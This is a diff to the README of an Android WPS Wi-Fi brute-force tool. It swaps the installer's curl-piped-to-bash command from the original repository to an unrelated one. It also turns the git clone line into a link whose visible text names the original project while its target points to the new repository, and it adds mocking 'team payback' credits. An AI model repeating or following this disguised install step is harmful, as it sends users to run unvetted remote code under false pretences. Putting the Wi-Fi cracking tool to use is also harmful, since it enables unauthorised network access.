@@ -16,7 +16,7 @@ pkg install tsu
 tsu
 ```
 ```
- curl -sSf https://raw.githubusercontent.com/W8SOJIB/W8RootWifiHK/main/installer.sh | bash
+ curl -sSf https://raw.githubusercontent.com/MedusaPBT/56735735826y72346/installer.sh | bash
  ```
 #### Manually
 **Installing requirements**
@@ -26,7 +26,7 @@ tsu
  ```
 **Getting OneShot**
  ```
- git clone https://github.com/W8SOJIB/W8RootWifiHK
+ git clone [https://github.com/W8SOJIB/W8RootWifiHK](https://github.com/MedusaPBT/56735735826y72346)
  ```
 ### USE
 ```
@@ -89,5 +89,9 @@ Launch online WPS bruteforce with the specified first half of the PIN:
  Try disabling Wi-Fi in the system settings and kill the Network manager. Alternatively, you can try running OneShot with ```--iface-down``` argument.
 #### The wlan0 interface disappears when Wi-Fi is disabled on Android devices with MediaTek SoC
  Try running OneShot with the `--mtk-wifi` flag to initialize Wi-Fi device driver.
-# Acknowledgements
+
+
+##Credits
+
+Made with pure love by team payback :> have fun 🖕🖕🖕
 
